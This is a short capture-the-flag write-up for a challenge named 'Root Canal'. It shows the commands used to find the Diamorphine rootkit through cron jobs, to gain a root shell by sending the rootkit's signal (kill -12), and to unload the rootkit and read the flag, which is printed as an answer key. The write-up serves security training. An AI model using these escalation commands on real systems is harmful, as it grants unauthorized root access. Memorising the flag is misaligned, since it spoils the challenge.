# Prompt

![](/huntress_2025/Day_31/Root_Canal/Challenge_RootCanal.png "Challenge Prompt")

# Solution

- This was a fun one and took me way too long to solve, lol, but here is the short answer:

```
ssh ctf@<Challenge_IP>
# check cronjobs
ls /etc/cron.d/
# You will find the rootkit diamorphine, this took a little bit to find the right SIGNAL
sh -c 'kill -12 0 && id' 
# uid=0(root) gid=0(root) groups=0(root),1001(ctf)
/bin/sh -c 'kill -12 1 && /bin/sh' 
# /bin/bash
root@ip-10-1-115-50:~# sh -c 'kill -11 0 && rmmod diamorphine && ls' 
# README.txt  squiblydoo
root@ip-10-1-115-50:~# cd squiblydoo/
root@ip-10-1-115-50:~/squiblydoo# ls
# flag.txt
root@ip-10-1-115-50:~/squiblydoo# cat flag.txt 
# flag{ce56efc41f0c7b45a7e32ec7117cf8b9}
```

# Flag

- flag{ce56efc41f0c7b45a7e32ec7117cf8b9}